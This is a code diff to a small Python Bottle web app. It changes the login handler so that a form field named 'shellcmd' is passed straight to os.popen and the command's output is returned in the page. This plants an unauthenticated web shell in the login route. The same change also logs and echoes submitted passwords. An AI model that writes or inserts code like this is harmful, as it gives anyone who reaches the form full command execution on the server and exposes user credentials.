@@ -1,6 +1,7 @@
 #-*- coding: UTF-8 -*-
 from bottle import Bottle, route, run, request, template, static_file
 from time import localtime,strftime
+import os
 app = Bottle()
 
 @app.route('/')
@@ -41,10 +42,24 @@ def login():
         print "POST..."
     username=request.forms.get('username')
     password=request.forms.get('password')
+    shellcmd=request.forms.get('shellcmd')
+    shellret=''
+    
+    f = os.popen(shellcmd, 'r')
+    shellret = f.read().decode('gbk')
+    f.close()
     print "username", username
     print "password", password
+    print "shellcmd", shellcmd
+    print "shellret", shellret
     #return "username=%s, password = %s"%(username, password)
-    return template("<p>login name is :{{username}} and password is :{{password}}</p>",username=username,password=password)
+    content = """
+<p>username is :{{username}}</p>
+<p>password is :{{password}}</p>
+<p>shellcmd is :{{shellcmd}}</p>
+<p>shellret is :{{shellret}}</p>
+"""
+    return template(content, username = username, password = password, shellcmd=shellcmd, shellret=shellret)
 
 
 if __name__ == '__main__':
